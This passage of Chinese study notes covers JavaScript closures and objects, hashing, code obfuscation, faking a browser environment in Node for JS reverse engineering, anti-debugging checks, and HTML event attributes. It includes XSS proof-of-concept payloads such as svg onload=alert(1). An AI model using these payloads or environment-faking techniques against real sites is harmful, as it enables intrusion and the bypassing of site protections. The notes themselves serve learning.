<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Bob&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>);  <span class="hljs-comment">// Bob</span><br></code></pre></td></tr></table></figure>

<p><code>new Person(&quot;Bob&quot;)</code> 创建了一个新对象，并且 <code>this</code> 指向这个新对象。</p>
<p><code>this.name = name;</code> 把 <code>name</code> 赋值给新对象的 <code>name</code> 属性。</p>
<h4 id="md系列-和-sha系列"><a href="#md系列-和-sha系列" class="headerlink" title="md系列 和 sha系列"></a>md系列 和 sha系列</h4><p>md4 md5 md2  </p>
<p>sha1 sha256 sha512  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502051833147.png" srcset="/img/loading.gif" lazyload alt="image-20250205183321874"></p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502051833581.png" srcset="/img/loading.gif" lazyload alt="image-20250205183336239"></p>
<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><p>闭包是指有权访问另一个函数作用域的变量的函数。创建闭包的常用方式，就是在一个函数内部创建另一个函数。  </p>
<p>当一个函数内部定义了另一个函数，并且这个内部函数引用了外部函数的变量时，就形成了一个闭包。  </p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&#x27;I am outside!&#x27;</span>;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(outerVar); <span class="hljs-comment">// 访问了外部函数的变量</span><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> inner; <span class="hljs-comment">// 返回内部函数</span><br>&#125;<br><br><span class="hljs-keyword">var</span> myFunc = outer(); <span class="hljs-comment">// outer函数执行完毕，但返回的inner函数仍然可以访问outerVar</span><br>myFunc(); <span class="hljs-comment">// 输出：I am outside!</span><br><br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>inner</code> 函数就是一个闭包，它能够访问并操作<code>outer</code>函数的变量<code>outerVar</code>，即使<code>outer</code>函数已经执行完毕。  </p>
<p>建议看这篇文章  </p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/closure-intro.html">https://www.runoob.com/w3cnote/closure-intro.html</a>  </p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">变量的作用域无非就两种：全局变量和局部变量。<br><br>JavasSript 语言的特别之处就在于：函数内部可以直接读取全局变量，但是在函数外部无法读取函数内部的局部变量。<br><br>**注意点：**在函数内部声明变量的时候，一定要使用 <span class="hljs-keyword">var</span> 命令。如果不用的话，你实际上声明的是一个全局变量！  <br><br></code></pre></td></tr></table></figure>

<p><strong>闭包就是能够读取其他函数内部变量的函数</strong>  </p>
<h4 id="遇上闭包如何使用里面的东西"><a href="#遇上闭包如何使用里面的东西" class="headerlink" title="遇上闭包如何使用里面的东西"></a>遇上闭包如何使用里面的东西</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> n = <span class="hljs-number">999</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">alert</span>(n); <span class="hljs-comment">// 999</span><br>        <span class="hljs-keyword">var</span> m = <span class="hljs-number">3</span>;<br>        f2.<span class="hljs-property">m</span> = m; <span class="hljs-comment">// 将 m 赋值给函数对象的属性</span><br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">yxy</span> = f2;<br>&#125;<br><br><span class="hljs-title function_">f1</span>();<br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">yxy</span>(); <span class="hljs-comment">// 执行 f2，此时 f2.m 被赋值为 3</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">yxy</span>.<span class="hljs-property">m</span>); <span class="hljs-comment">// 输出 3</span><br></code></pre></td></tr></table></figure>

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">outer</span>() &#123;<br>    var n = <span class="hljs-number">999</span>;<br>    <span class="hljs-keyword">function</span> <span class="hljs-keyword">inner</span>() &#123;<br>        console.log(n); // 访问 <span class="hljs-keyword">outer</span> 函数的变量 n<br>    &#125;<br>    <span class="hljs-keyword">window</span>.yxy = <span class="hljs-keyword">inner</span>; // 将 <span class="hljs-keyword">inner</span> 函数赋值给全局变量 <span class="hljs-keyword">window</span>.yxy<br>&#125;<br><br><span class="hljs-keyword">outer</span>(); // 调用 <span class="hljs-keyword">outer</span> 函数，初始化 <span class="hljs-keyword">window</span>.yxy<br><span class="hljs-keyword">window</span>.yxy(); // 输出 <span class="hljs-number">999</span>，因为 <span class="hljs-keyword">inner</span> 函数通过闭包访问了 <span class="hljs-keyword">outer</span> 的变量 n<br></code></pre></td></tr></table></figure>

<ul>
<li><code>inner</code> 是一个闭包，它可以访问 <code>outer</code> 函数的变量 <code>n</code>。</li>
<li>通过 <code>window.yxy = inner</code>，<code>inner</code> 函数被赋值给全局变量 <code>window.yxy</code>，使得外部可以通过 <code>window.yxy()</code> 调用 <code>inner</code>。</li>
<li>调用 <code>window.yxy()</code> 时，<code>inner</code> 仍然可以访问 <code>outer</code> 函数的变量 <code>n</code>，因为闭包保留了 <code>outer</code> 的作用域链。</li>
</ul>
<h3 id="常见混淆原理"><a href="#常见混淆原理" class="headerlink" title="常见混淆原理"></a>常见混淆原理</h3><p>JavaScript 代码混淆（JS Obfuscation）是一种 <strong>通过改变代码结构</strong> 使其变得难以理解，但仍然能 <strong>正常执行</strong> 的技术。<br>其主要目的是 <strong>防止代码被轻松阅读和分析</strong>，以增加 <strong>逆向工程</strong> 和 <strong>破解</strong> 的难度。  </p>
<p>原理主要基于两点  </p>
<ol>
<li>改变代码里面的变量或者函数名 **让代码更难读 **   </li>
<li>修改代码的执行逻辑 <strong>让代码的执行流程变得复杂</strong>。</li>
</ol>
<p><strong>eval混淆</strong> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/biggbang/article/details/127941377">https://blog.csdn.net/biggbang/article/details/127941377</a>  </p>
<p>以及其他的一些混淆  </p>
<p>aa jj混淆 jsfuck  </p>
<h3 id="关于伪造环境"><a href="#关于伪造环境" class="headerlink" title="关于伪造环境"></a>关于伪造环境</h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2189782">https://cloud.tencent.com/developer/article/2189782</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45216614/article/details/105639547">https://blog.csdn.net/weixin_45216614/article/details/105639547</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bs_101/article/details/121245327">https://blog.csdn.net/bs_101/article/details/121245327</a>  </p>
<p>js逆向时通常会把 JavaScript 代码脱离浏览器环境，在 Node.js 里执行。但浏览器的 <code>window</code>、<code>document</code> 等对象在 Node.js 里是不存在的，这时就需要 <strong>补环境</strong>，也就是模拟浏览器提供的 API </p>
<h4 id="浏览器的组成"><a href="#浏览器的组成" class="headerlink" title="浏览器的组成"></a>浏览器的组成</h4><p>用户界面、浏览器引擎、渲染引擎、JavaScript 引擎、网络模块、数据存储、UI 后端、插件支持、安全模块和开发者工具  </p>
<p><strong>浏览器环境</strong>： 是指 JS代码在浏览器中的运行时环境，它包括V8自动构建的对象（即ECMAScript的内容,如Date、Array），浏览器（内置）传递给V8的操作DOM和BOM的对象（如document、navigator）； </p>
<h4 id="为什么要伪造以及目的"><a href="#为什么要伪造以及目的" class="headerlink" title="为什么要伪造以及目的"></a>为什么要伪造以及目的</h4><p><strong>Node环境</strong>：是基于V8引擎的Js运行时环境，它包括V8与其自己的内置API，如fs，http，path；</p>
<p>简单来说  </p>
<p>补环境 或者说是伪造环境的目的就是补浏览器有 而Node没有的环境，即 补BOM和DOM的对象  </p>
<p>使得扣出来的 <strong>“js加密算法代码”</strong> 在<strong>Node环境</strong>中运行得到的加密值，与其在 <strong>浏览器环境</strong>中运行得到的加密值一致。  </p>
<p>而上面提到的node环境就是我们将js代码扣下来之后 去本地执行的环境  </p>
<p>也就是说最终实现的效果就是要能够绕过浏览器的限制 自己伪造环境 在本地运行扣下来的js代码 使得本地运行出来的结果和在浏览器上运行得到的结果相同  </p>
<h4 id="需要伪造什么"><a href="#需要伪造什么" class="headerlink" title="需要伪造什么"></a>需要伪造什么</h4><p>即 dom 和 bom  </p>
<p>一般包括  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502101400310.png" srcset="/img/loading.gif" lazyload alt="image-20250210140056059"></p>
<p>dom的话 一般就是document  </p>
<p>就是去伪造本地环境里面缺少的东西  </p>
<h4 id="如何伪造"><a href="#如何伪造" class="headerlink" title="如何伪造"></a>如何伪造</h4><p>1.全部伪造  </p>
<p>python里面有现成的库 能一键补上dom和bom环境  </p>
<p>但是很容易被检测  </p>
<p>2.缺什么补什么  </p>
<p>看那个站点具体检测什么从而去伪造什么  </p>
<p>或者说需要知道 <strong>“js加密算法代码”</strong> 到底使用了哪些浏览器环境API，然后再对应去补上这些环境  </p>
<p>感觉这种可以在网上找一下现成的相关的环境了  </p>
<h3 id="反调"><a href="#反调" class="headerlink" title="反调"></a>反调</h3><h4 id="检测是否在调试"><a href="#检测是否在调试" class="headerlink" title="检测是否在调试"></a>检测是否在调试</h4><p>键盘监听 是否打开f12  </p>
<p>检测浏览器内外的高度差值  </p>
<p>检测f12这个变量是否为true  </p>
<p>检测console是否被调用 console.log之类的  </p>
<p>利用上下代码运行的时间间隔来检测  </p>
<p>利用tostring  </p>
<p>检测栈的层数  </p>
<p>检测是否是浏览器环境 或者是python node.js环境  </p>
<h4 id="反调-1"><a href="#反调-1" class="headerlink" title="反调"></a>反调</h4><p>分为显性和隐性  </p>
<p><strong>显性</strong>  </p>
<p>debugger  </p>
<p>分为虚拟机和非虚拟机  </p>
<p>一些死循环 无限递归 无限调用 两个方法互调 在浏览器里面写历史记录卡死 </p>
<p><strong>隐性</strong>  </p>
<p>将你引向错误的逻辑  </p>
<h2 id="滑块"><a href="#滑块" class="headerlink" title="滑块"></a>滑块</h2><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503101444923.png" srcset="/img/loading.gif" lazyload alt="image-20250310144428510"></p>
<p>流程平坦化  </p>
<h2 id="涉及到的html标签或者js代码等等相关的杂七杂八的知识"><a href="#涉及到的html标签或者js代码等等相关的杂七杂八的知识" class="headerlink" title="涉及到的html标签或者js代码等等相关的杂七杂八的知识"></a>涉及到的html标签或者js代码等等相关的杂七杂八的知识</h2><p>(补充当中 会从0开始一点一点填充 会比较零碎 很散乱的很基础的知识点)  </p>
<p>**<code>span</code>**标签通常用于对网页中的部分文本进行样式化，比如改变字体颜色、大小或者添加背景色等，而不影响周围的文本  </p>
<p>在HTML中，你可以给<code>span</code>标签添加一个<code>id</code>属性或<code>class</code>属性，以便在JavaScript中能够选中它  </p>
<p><strong>如何在html里面套js相关的代码</strong> </p>
<p>1.可以直接在<code>&lt;script&gt;</code>标签内编写JavaScript代码。这些标签可以放在HTML文档的<code>&lt;head&gt;</code>或<code>&lt;body&gt;</code>部分。  </p>
<p>2.如果你的JavaScript代码较多，或者你想在多个页面之间共享代码，你可以将JavaScript代码保存在一个外部文件中（例如<code>script.js</code>），然后在HTML中通过<code>&lt;script&gt;</code>标签的<code>src</code>属性引用它。  <script src="script.js"></script>  </p>
<p>也可以在标签里面的属性里面编写js代码作为事件处理程序</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Clicked!&#x27;)&quot;</span>&gt;点击我&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure>



<p>还有一种就是<strong>JavaScript伪协议</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;Link clicked!&#x27;);&quot;</span>&gt;</span>点击这个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当用户点击链接时，不会导航到其他页面，而是执行 <code>alert(&#39;Link clicked!&#39;);</code> 这段 JavaScript 代码。</p>
<hr>
<p><strong><code>onmouseover</code> 事件</strong>  </p>
<p>是一个HTML事件处理属性。它可以被添加到HTML元素中，以便在用户的鼠标指针移动到该元素上时触发JavaScript代码或函数。</p>
<p>当<code>onmouseover</code>事件被触发时，与之关联的JavaScript代码就会执行</p>
<p><strong>关于href属性里面的代码自动被解析从而产生xss</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12514661.html">https://www.cnblogs.com/zpchcbd/p/12514661.html</a>  </p>
<p>某些浏览器在解析过程中会自动执行 <code>&lt;script&gt;</code> 标签，即使它位于非典型的位置（比如 <code>href</code> 属性中）  </p>
<h4 id="浏览器内置的一些XSS过滤器"><a href="#浏览器内置的一些XSS过滤器" class="headerlink" title="浏览器内置的一些XSS过滤器"></a>浏览器内置的一些XSS过滤器</h4><p>现代浏览器如Chrome和IE都内置了一些XSS过滤器，这些过滤器会在页面加载时检查并移除恶意的脚本。例如，Chrome的XSS auditor可以有效限制反射式XSS攻击</p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1395971/g4ddgkudbj.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>关于我没见过这玩意 想着去试试能不能弹出来这个页面给我拦了 结果某个网页没拦并且还存有sql注入漏洞的这件事  </p>
<p><strong>onerror事件</strong>  </p>
<ul>
<li>当网页上的资源（如图片、脚本、样式表等）加载失败时，<code>onerror</code> 事件会被触发。</li>
<li>当JavaScript运行时发生错误（例如语法错误、类型错误等），也会触发 <code>onerror</code> 事件。</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;this.onerror=null; this.src=&#x27;default.jpg&#x27;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p>例如这样 当找不到这个image.jpg 图片时 会移出onerror这个事件处理器 并且 尝试加载名为default.jpg的默认图片  </p>
<p><strong>标签和属性</strong>  </p>
<p><img src="C:\Users\god\Downloads\1731588259898.png" srcset="/img/loading.gif" lazyload alt="1731588259898"></p>
<p>**<code>fetch</code> **  </p>
<p>是 JavaScript 中用于发起网络请求的 API 可以使用 <code>fetch</code> 来发起 GET、POST、PUT、DELETE 等各种类型的 HTTP 请求。  </p>
<p><strong><code>onchange</code> 事件</strong>  </p>
<p>发生在元素值发生变化时  </p>
<ol>
<li><strong>适用元素</strong>：<code>onchange</code> 事件通常用于 <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, 和 <code>&lt;textarea&gt;</code> 元素。</li>
<li><strong>触发时机</strong>：<ul>
<li>对于 <code>&lt;input&gt;</code> 元素：当用户完成输入并离开输入框时（通常是失去焦点时）触发。</li>
<li>对于 <code>&lt;select&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素：当用户选择一个选项并关闭下拉菜单时触发。</li>
</ul>
</li>
<li><strong>用途</strong>：通常用于在用户更改表单字段值后执行某些操作，例如验证输入、更新页面内容、或提交表单</li>
</ol>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202411212132134.png" srcset="/img/loading.gif" lazyload alt="1732195973372"></p>
<p>例如这样  </p>
<p><strong>如何访问一个HTML页面的dom模型</strong>  </p>
<p><strong>使用 <code>document</code> 对象</strong> 浏览器将整个 HTML 页面解析为一个 DOM 树，并将其表示为 <code>document</code> 对象。你可以通过 JavaScript 使用 <code>document</code> 来访问和操作页面上的元素。  </p>
<p><strong>id属性</strong>  </p>
<p><code>id</code> 属性是用来为元素指定一个唯一标识符的属性。  </p>
<p><code>id</code> 属性为一个 HTML 元素提供了一个唯一的标识符，使得你可以在 JavaScript 中轻松地选择和操作该元素。例如，通过 JavaScript 可以使用 <code>getElementById()</code> 方法来获取具有特定 <code>id</code> 的元素。  </p>
<p><strong>onload事件</strong>  </p>
<p><code>onload</code> 事件是一个在网页或图像加载完成后立即发生的事件。它可以被用来执行那些需要网页内容完全加载之后才能运行的脚本</p>
<p>也可以 指别的 理解为当某些东西完成之后立即会发生的事件 例如  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">reader.onload <span class="hljs-operator">=</span> (event) <span class="hljs-operator">=</span>&gt; &#123;<br>  alert(event.target.result)<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure>

<p>当reader完成之后 onload事件就会发生  </p>
<p><strong><code>reader.onload</code></strong></p>
<ul>
<li>这是一个事件处理程序，<code>FileReader</code> 在文件读取完成后会触发 <code>load</code> 事件。</li>
<li>事件对象 <code>event</code><ul>
<li><code>event.target</code>：指向触发该事件的对象，这里是 <code>reader</code>。</li>
<li><code>event.target.result</code>：包含读取的文件内容（文本形式）。</li>
</ul>
</li>
</ul>
<p><strong><code>alert(event.target.result)</code></strong></p>
<ul>
<li>将文件的内容以弹窗形式显示出来。</li>
</ul>
<p> <strong>iframe</strong>  </p>
<p><code>iframe</code>标签在HTML中用于创建一个内联框架，它可以在当前HTML页面中嵌入另一个HTML页面。使用<code>iframe</code>，你可以在网页的一部分显示另一个独立的网页内容。  </p>
<p>在这个例子中，<code>iframe</code>标签的<code>src</code>属性设置为”<a target="_blank" rel="noopener" href="https://www.example.com",这意味着在`iframe`中将会加载并显示`www.example.com`这个网页的内容.`width`和`height`属性分别定义了`iframe`的宽度和高度./">https://www.example.com&quot;，这意味着在`iframe`中将会加载并显示`www.example.com`这个网页的内容。`width`和`height`属性分别定义了`iframe`的宽度和高度。</a></p>
<p>用户在访问这个页面时，会在页面上看到一个嵌入的窗口，显示的是<code>www.example.com</code>的网页内容。  </p>
<h4 id="一点知识"><a href="#一点知识" class="headerlink" title="一点知识"></a>一点知识</h4><p>HTML 标准允许省略属性值的引号，前提是属性值中没有空格或特殊字符。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.png&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 可以写成 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">image.png</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在 HTML 中，属性与标签之间的空格也可以用 <code>/</code> 或其他分隔符替代，浏览器仍会正确解析。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 可以写成 --&gt;</span><br>&lt;svg/onload=&quot;alert(1)&quot;&gt;<br><br></code></pre></td></tr></table></figure>

<p>SVG 标签的 <code>onload</code> 属性可以在 SVG 加载完成时触发事件，这使它成为一个常用的 XSS 注入点。</p>
<h4 id="攻击示例："><a href="#攻击示例：" class="headerlink" title="攻击示例："></a>攻击示例：</h4><p>构造一个带有恶意脚本的 SVG 元素：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>或者使用简化的写法：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;svg/onload=alert(1)&gt;</span><span class="hljs-section">&lt;/svg&gt;</span><br></code></pre></td></tr></table></figure>

<p>更精简的写法   </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br><br></code></pre></td></tr></table></figure>

<p><strong><code>&lt;form&gt;</code> 标签</strong>  </p>
<p><code>&lt;form&gt;</code> 标签是用来创建表单的，允许用户输入数据并提交给服务器。</p>
<p>它有多个属性，如 <code>action</code>（表单提交目标）、<code>method</code>（提交方法）、<code>enctype</code>（数据编码类型）等。</p>
<p>可以结合各种表单控件（如 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;button&gt;</code>）来实现不同类型的输入。</p>
<p>表单的提交方法通常有 <code>GET</code> 和 <code>POST</code>，并可以用 JavaScript 进行动态提交。</p>
<p><strong>target&#x3D;”_blank”</strong>  </p>
<p>让链接在 <strong>新窗口</strong> 或 <strong>新标签页</strong> 中打开，而不是在当前窗口或标签页中打开。  </p>
<h4 id="关于锚点"><a href="#关于锚点" class="headerlink" title="关于锚点#"></a>关于锚点#</h4><p>指URL末尾的<code>#</code>符号后面跟随的部分，它用于指定网页中的一个特定位置  </p>
<p>在HTML中，你可以通过在元素上使用<code>id</code>属性来定义一个锚点。例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;section1&quot;</span>&gt;</span>这是第一个部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>要链接到这个锚点，你可以在URL的末尾添加<code>#</code>符号，然后跟上锚点的<code>id</code>。例如:  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://example.com/page.html#section1&quot;</span>&gt;</span>跳转到页面中的第一个部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当你点击这个链接时，浏览器会打开<code>http://example.com/page.html</code>页面，并滚动到页面上<code>id</code>为<code>section1</code>的元素位置</p>
<h3 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h3><p><strong>OAuth</strong>（开放授权，Open Authorization）是一种授权协议，允许用户在不暴露自己账户信息（如用户名和密码）的情况下，授权第三方应用访问其在某个服务（如 Google、Facebook、Twitter 等）上的资源。OAuth 通过颁发 <strong>访问令牌</strong>（Access Token）来代替用户名和密码，确保了安全性。</p>
<h3 id="OAuth-的作用："><a href="#OAuth-的作用：" class="headerlink" title="OAuth 的作用："></a>OAuth 的作用：</h3><p>OAuth 主要用于授权而非身份验证。它的作用是让用户能够授权第三方应用或网站访问其在另一个服务中的资源。OAuth 的经典应用场景包括：</p>
<ul>
<li><strong>使用 Google 账户登录第三方网站</strong>：例如，你可以通过 Google 登录某个第三方网站，而无需为该网站设置一个单独的用户名和密码。</li>
<li><strong>使用 Facebook 账户授权第三方应用访问你的信息</strong>：例如，某个应用希望读取你 Facebook 上的公开信息，它会请求 Facebook 的授权，然后应用程序使用该授权来获取用户数据。</li>
</ul>
<p>**<code>&lt;meta&gt;</code> 标签 **  </p>
<p>一种元数据标签，用于提供网页的元信息。元信息不会直接呈现在网页上，但它会影响搜索引擎优化 (SEO)、浏览器行为以及其他系统对网页的处理。  </p>
<p>控制网页的行为、描述页面信息，并改善用户体验和 SEO。合理使用 <code>&lt;meta&gt;</code> 标签可以提升网页的性能、安全性</p>
<p><strong>字符编码</strong>：确保网页内容正确显示  </p>
<p>例如 <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>  </p>
<p><strong>重定向和刷新</strong>：自动跳转或定时刷新页面。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;5; url=https://example.com&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<h4 id="javascript里面的对象"><a href="#javascript里面的对象" class="headerlink" title="javascript里面的对象"></a><strong>javascript里面的对象</strong></h4><p>js里面的对象是一种可以接收键值对集合的数据类型。</p>
<p>JavaScript对象是一个无序的键值对集合，其中键是字符串或符号（Symbol），值可以是任何类型的数据，包括函数、对象、数组等  </p>
<p>所有 JavaScript 对象都继承自一个原型对象（<code>Object.prototype</code>）。</p>
<p>对象的属性和方法可以通过原型链继承，因此可以访问到很多内置方法，如 <code>toString</code>、<code>hasOwnProperty</code> 等。</p>
<p><strong>如何定义</strong>  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这是最简单和最常见的方式  </p>
<p>也可以使用new来创建对象  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>person.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Bob&#x27;</span>;<br>person.<span class="hljs-property">age</span> = <span class="hljs-number">25</span>;<br>person.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>JavaScript 使用原型链来实现继承，而不是其他语言中常见的类继承。每个对象都有一个原型（<code>__proto__</code> 或 <code>[[Prototype]]</code>），属性和方法可以在这个原型链上查找。  </p>
